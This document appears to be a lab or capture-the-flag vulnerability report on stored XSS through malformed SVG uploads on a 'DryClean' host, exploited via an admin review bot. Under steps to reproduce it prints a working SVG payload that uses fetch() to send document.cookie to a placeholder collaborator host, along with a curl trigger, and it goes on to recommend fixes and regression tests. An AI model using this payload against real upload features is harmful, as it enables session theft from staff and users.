# Stored XSS Via Malformed SVG Upload On DryClean

## Title

Malformed SVG upload bypasses sanitization and executes in admin review flow

## Summary

DryClean accepts image uploads and lets users send a specific hung item to an admin bot. Well-formed SVG is sanitized, but malformed SVG that the server cannot parse is stored unchanged and served as `text/html` from `/items/<hash>.svg`. An attacker can upload unclosed SVG containing JavaScript, trigger the admin bot, and exfiltrate privileged cookie data through an out-of-band collaborator.

## Scope

- Host: `6e994271231d.pwnbox-lab.com`
- Endpoints: `POST /api/upload`, `GET /items/<hash>.<ext>`, `POST /api/send`

## Severity Reasoning

High in the lab context because it yields direct disclosure of privileged admin session data through a one-click review feature. In production, the same pattern would allow staff-session theft or unauthorized actions through support/review bots.

## Affected Endpoint

```text
POST /api/upload
GET  /items/<hash>.svg
POST /api/send
```

## Preconditions

- Attacker can upload files to the rack.
- Attacker can trigger the admin bot with the returned upload hash.
- Admin bot opens the stored file URL directly.
- Sensitive cookie data is readable from JavaScript in the bot session.

## Steps To Reproduce

1. Create an OAST session or other collaborator endpoint.
2. Upload malformed SVG:

   ```xml
   <svg xmlns="http://www.w3.org/2000/svg"><script>
   fetch('https://[collaborator]/?c='+encodeURIComponent(document.cookie))
   </script>
   ```

3. Verify the stored object at `/items/<hash>.svg` returns `Content-Type: text/html` and still contains the script.
4. Submit the upload hash to the review bot:

   ```bash
   curl -sS -X POST "https://[host]/api/send" \
     -H "Content-Type: application/json" \
     -d '{"hash":"<hash>"}'
   ```

5. Observe the collaborator callback containing encoded cookie or flag data.

## Proof Of Concept

Malformed SVG upload with OAST exfiltration, followed by `POST /api/send` on the returned hash. Stored object served as `text/html` from a `.svg` URL on the application origin.

## Evidence

- Well-formed SVG uploads had `<script>` removed during storage.
- Malformed SVG retained the script payload.
- Stored response header was `Content-Type: text/html`.
- Admin bot produced an out-of-band HTTP request containing `document.cookie` data from the lab origin.

## Impact

- Stored XSS against the admin review bot
- Disclosure of privileged session or flag data
- Potential same-origin abuse in real review workflows

## Recommended Fix

- Reject malformed SVG/XML instead of storing raw bytes
- Sanitize or rasterize SVG regardless of parser outcome
- Do not serve upload content as `text/html` from the application origin
- Host uploads on an isolated origin without application cookies
- Mark sensitive cookies `HttpOnly`

## Regression Test

1. Upload unclosed SVG with `<script>` and verify it is rejected or rendered inert.
2. Verify `/items/<hash>.svg` cannot be served as `text/html` with executable script.
3. Verify admin review flows do not execute attacker-controlled upload content.
4. Verify privileged cookies are not exposed to `document.cookie`.

## Timeline Notes

- Well-formed SVG and PNG polyglot paths were insufficient on their own.
- Parser-failure SVG served as `text/html` provided the working execution primitive.
- OAST polling confirmed admin bot execution and exfiltration.
